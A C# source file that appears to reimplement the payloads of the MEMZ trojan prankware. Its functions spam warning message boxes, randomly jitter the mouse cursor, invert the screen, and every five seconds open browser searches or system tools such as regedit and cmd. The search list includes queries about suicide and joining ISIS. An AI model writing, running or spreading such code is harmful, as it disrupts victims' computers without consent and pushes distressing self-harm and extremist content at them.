using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Diagnostics;
namespace MEMZPayloads
{
    public class MemzClone
    {
        private static string[] payloads = new string[] {
    "http://google.co.ck/search?q=best+way+to+kill+yourself",
    "http://google.co.ck/search?q=how+2+remove+a+virus",
    "http://google.co.ck/search?q=mcafee+vs+norton",
    "http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend",
    "http://google.co.ck/search?q=minecraft+hax+download+no+virus",
    "http://google.co.ck/search?q=how+to+get+money",
    "http://google.co.ck/search?q=bonzi+buddy+download+free",
    "http://google.co.ck/search?q=how+2+buy+weed",
    "http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
    "http://google.co.ck/search?q=what+happens+if+you+delete+system32",
    "http://google.co.ck/search?q=g3t+r3kt",
    "http://google.co.ck/search?q=batch+virus+download",
    "http://google.co.ck/search?q=virus.exe",
    "http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
    "http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
    "http://google.co.ck/search?q=virus+builder+legit+free+download",
    "http://google.co.ck/search?q=how+to+create+your+own+ransomware",
    "http://google.co.ck/search?q=how+to+remove+memz+trojan+virus",
    "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
    "http://google.co.ck/search?q=dank+memz",
    "http://google.co.ck/search?q=how+to+download+memz",
    "http://google.co.ck/search?q=half+life+3+release+date",
    "http://google.co.ck/search?q=is+illuminati+real",
    "http://google.co.ck/search?q=montage+parody+making+program+2016",
    "http://google.co.ck/search?q=the+memz+are+real",
    "http://google.co.ck/search?q=stanky+danky+maymays",
    "http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
    "http://google.co.ck/search?q=vinesauce+meme+collection",
    "http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
    "http://play.clubpenguin.com",
    "http://pcoptimizerpro.com",
    "http://softonic.com",
    "http://google.co.ck/search?q=how+to+join+ISIS", // IM JOKING FBI I SWEAR
    "calc",
    "notepad",
    "cmd",
    "write",
    "regedit",
    "explorer",
    "taskmgr",
    "msconfig",
    "mspaint",
    "devmgmt.msc",
    "control",
    "mmc"
    };
        [DllImport("user32.dll")]
        private static extern void SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        private static extern bool GetCursorPos(out Point lpPoint);

        [DllImport("user32.dll")]
        private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height,
            IntPtr hdcSrc, int xSrc, int ySrc, int rop);

        private static Random random = new Random();
        private static Thread? cursorThread, messageBoxThread, blinkThread, browserThread;
        private static bool cursorRunning, messageBoxRunning, blinkRunning, browserRunning;

        public static void StartBrowserPayload()
        {
            if (browserThread == null || !browserThread.IsAlive)
            {
                browserRunning = true;
                browserThread = new Thread(BrowserPayload);
                browserThread.Start();
            }
        }
        public static void StartCursorPayload()
        {
            if (cursorThread == null || !cursorThread.IsAlive)
            {
                cursorRunning = true;
                cursorThread = new Thread(CursorPayload);
                cursorThread.Start();
            }
        }

        public static void StopCursorPayload()
        {
            cursorRunning = false;
        }

        public static void StartMessageBoxPayload()
        {
            if (messageBoxThread == null || !messageBoxThread.IsAlive)
            {
                messageBoxRunning = true;
                messageBoxThread = new Thread(MessageBoxPayload);
                messageBoxThread.Start();
            }
        }

        public static void StopMessageBoxPayload()
        {
            messageBoxRunning = false;
        }

        public static void StartBlinkPayload()
        {
            if (blinkThread == null || !blinkThread.IsAlive)
            {
                blinkRunning = true;
                blinkThread = new Thread(BlinkPayload);
                blinkThread.Start();
            }
        }

        public static void StopBlinkPayload()
        {
            blinkRunning = false;
        }
        public static void StopBrowserPayload()
        {
            browserRunning = false;
        }
        private static void CursorPayload()
        {
            while (cursorRunning)
            {
                if (GetCursorPos(out Point cursor))
                {
                    SetCursorPos(cursor.X + (random.Next(3) - 1) * random.Next(3),
                        cursor.Y + (random.Next(3) - 1) * random.Next(3));
                }
                Thread.Sleep(10);
            }
        }

        private static void MessageBoxPayload()
        {
            while (messageBoxRunning)
            {
                new Thread(() => MessageBox(IntPtr.Zero, "Still using this computer?", "lol", 0x30 | 0x1000)).Start();
                Thread.Sleep(2000);
            }
        }

        private static void BrowserPayload()
        {
            while (browserRunning)
            {
                int randomindex = random.Next(payloads.Length);
                Process.Start(payloads[randomindex]);
                Thread.Sleep(5000);
            }

        }
        private static void BlinkPayload()
        {
            while (blinkRunning)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                BitBlt(hdc, 0, 0, Console.WindowWidth, Console.WindowHeight, hdc, 0, 0, 0x330008);
                ReleaseDC(hwnd, hdc);
                Thread.Sleep(100);
            }
        }
    }
}
